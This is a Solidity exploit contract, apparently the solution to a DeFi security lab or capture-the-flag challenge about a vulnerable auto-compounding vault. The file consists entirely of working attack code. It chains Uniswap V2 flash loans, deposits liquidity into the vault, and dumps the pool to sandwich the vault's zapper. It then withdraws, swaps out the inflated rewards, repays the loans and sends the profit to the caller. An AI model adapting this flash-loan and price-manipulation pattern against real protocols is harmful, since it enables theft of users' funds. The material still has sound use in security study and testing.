// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {Token} from "src/other/Token.sol";
import {AutoCompoundVault} from "src/fatality/AutoCompoundVault.sol";
import {console} from "forge-std/console.sol";

contract FatalityExploiter {
    Token usdc;
    Token bnb;
    Token bunny;
    IUniswapV2Pair usdcBnbPair;
    IUniswapV2Pair bnbBunnyPair;
    IUniswapV2Pair daiBnbPair;
    IUniswapV2Pair usdcDaiPair;
    IUniswapV2Router02 uniRouter;
    AutoCompoundVault vault;
    uint nonce = 0;

    function startExploit(address _usdcDaiPair, address _bnbBunnyPair, address _usdcBnbPair, address _daiBnbPair, address _uniRouter, address _bunny, address _usdc, address _bnb, address _vault) public {
        usdc = Token(_usdc);
        bnb = Token(_bnb);
        bunny = Token(_bunny);
        usdcBnbPair = IUniswapV2Pair(_usdcBnbPair);
        bnbBunnyPair = IUniswapV2Pair(_bnbBunnyPair);
        uniRouter = IUniswapV2Router02(_uniRouter);
        vault = AutoCompoundVault(_vault);
        daiBnbPair = IUniswapV2Pair(_daiBnbPair);
        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair);
        usdcDaiPair.swap(900_000e18, 0, address(this), 'not empty');
    }

    function uniswapV2Call(address, uint _amount0, uint, bytes memory) external {
        if (nonce++ == 0) {
            daiBnbPair.swap(2999e18, 0, address(this), 'not empty');
            uint256 loanPlusInterestUsdc = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed
            console.log('usdc to pay', loanPlusInterestUsdc / 1e18);
            usdc.transfer(address(daiBnbPair), loanPlusInterestUsdc);
        } else {
            bnb.approve(address(uniRouter), type(uint).max);
            usdc.approve(address(uniRouter), type(uint).max);
            uniRouter.addLiquidity(
                address(usdc), address(bnb),
                890_000e18, 2999e18,
                0, 0,
                address(this), block.timestamp
            );
            usdcBnbPair.transfer(address(usdcBnbPair),usdcBnbPair.balanceOf(address(this))-1e18);
            usdcBnbPair.approve(address(vault), type(uint).max);
            vault.depositAll();
            address[] memory path = new address[](2);
            path[0] = address(bnb);
            path[1] = address(usdc);
            // @audit Here is where the magic happens, we dump the pool and wait for the zapper to addLiquidity, making a sandwitch attack
            uniRouter.swapExactTokensForTokens(
                bnb.balanceOf(address(this)), 
                0, path, address(this), block.timestamp
            );
            vault.withdrawAllAndEarn();
            usdcBnbPair.approve(address(uniRouter), type(uint).max);
            uniRouter.removeLiquidity(
                address(usdc), address(bnb),
                usdcBnbPair.balanceOf(address(this)),
                0, 0,
                address(this), block.timestamp
            );

            bunny.approve(address(uniRouter),type(uint256).max);
            path[0] = address(bunny);
            path[1] = address(bnb);
            uniRouter.swapExactTokensForTokens(
                bunny.balanceOf(address(this)), 0, path, address(this), block.timestamp
            );

            path[0] = address(usdc);
            path[1] = address(bnb);
            uniRouter.swapExactTokensForTokens(
                usdc.balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp
            );

            path[0] = address(bnb);
            path[1] = address(usdc);
            uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed
            uniRouter.swapExactTokensForTokens(
                bnb.balanceOf(address(this)) - loanPlusInterest - 1100e18,
                0,
                path,
                address(this),
                block.timestamp
            );
            console.log("bunny balance", bunny.balanceOf(address(this)) / 1e18);
            console.log("bnb balance", bnb.balanceOf(address(this)) / 1e18);
            console.log("usdc balance", usdc.balanceOf(address(this)) / 1e18);
            console.log("bunnyBnb balance", bnbBunnyPair.balanceOf(address(this)) / 1e18);
            console.log("usdcBnb balance", usdcBnbPair.balanceOf(address(this)) / 1e18);
            console.log("bnb to pay", loanPlusInterest / 1e18);
            bnb.transfer(msg.sender,loanPlusInterest); // pay back flashloan
            bnb.transfer(tx.origin,bnb.balanceOf(address(this))); // lazy        bnb.transfer(msg.sender, bnb.balanceOf(address(this)));
        }
    }
}